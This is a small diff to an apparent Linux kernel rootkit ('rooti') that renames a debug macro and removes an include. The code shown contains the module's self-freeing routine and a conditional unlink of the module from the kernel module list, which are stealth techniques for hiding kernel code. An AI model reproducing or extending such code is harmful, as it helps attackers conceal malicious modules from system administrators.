@@ -4,7 +4,6 @@
 #include <linux/notifier.h>
 #include <linux/async.h>
 #include "unloading.h"
-#include "../config.h"
 #include "../utils.h"
 
 // Implemented in asm/unloading.S
@@ -31,7 +30,7 @@ static int __try_release_module_ref(struct module *mod)
 // Similar to the kernel's free_module()
 static void rooti_self_free(void)
 {
-#ifdef ROOTI_DEBUG_SHOWME
+#ifdef ROOTI_DEBUG_SHOW_ME
     rooti_sym_repo.mod_sysfs_teardown(THIS_MODULE);
 #endif
 
@@ -47,7 +46,7 @@ static void rooti_self_free(void)
 
     mutex_lock(rooti_sym_repo.module_mutex);
 
-#ifdef ROOTI_DEBUG_SHOWME
+#ifdef ROOTI_DEBUG_SHOW_ME
     list_del_rcu(&THIS_MODULE->list);
 #endif
 
